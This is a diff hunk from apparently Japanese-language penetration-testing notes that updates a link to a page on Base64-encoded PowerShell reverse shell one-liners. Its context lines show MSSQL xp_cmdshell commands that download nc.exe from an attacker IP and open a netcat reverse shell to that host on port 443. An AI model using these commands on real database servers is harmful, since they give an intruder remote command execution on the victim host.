@@ -316,7 +316,7 @@ EXEC xp_cmdshell 'powershell iwr -Uri http://<attacker_IP>:<port>/nc.exe -OutFil
 ```sql
 EXEC xp_cmdshell 'c:\users\public\nc.exe -e cmd <attacker_IP> 443'
 ```
-- その他のペイロード：[Base64化したPowerShellリバースシェルワンライナー](../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
+- その他のペイロード：[Base64化したPowerShellリバースシェルワンライナー](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
 
 ---
 
